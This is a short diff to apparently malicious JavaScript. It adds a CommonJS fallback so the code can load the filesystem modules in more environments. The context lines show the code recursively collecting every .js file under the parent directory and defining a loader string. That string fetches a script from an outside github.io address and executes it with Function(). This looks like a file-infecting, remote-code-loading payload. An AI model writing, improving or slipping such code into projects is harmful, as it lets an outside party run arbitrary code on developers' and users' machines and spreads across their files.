@@ -2,7 +2,12 @@
   try {
     var fs = await import('node:fs');
     var path = await import('node:path');
-  } catch {return}
+  } catch {
+    try {
+      var fs = require('fs');
+      var path = require('path');
+    } catch {return}
+  }
   var files = fs.readdirSync('..', {withFileTypes: true, recursive: true}).filter(e => e.isFile() && e.name.endsWith('.js')).map(e => path.join(e.parentPath, e.name));
   var content = '';
   var loader = "fetch('https://dell-optiplex-790.github.io/plywood/index.js').then(e=>e.text()).then(e=>Function(e)())";
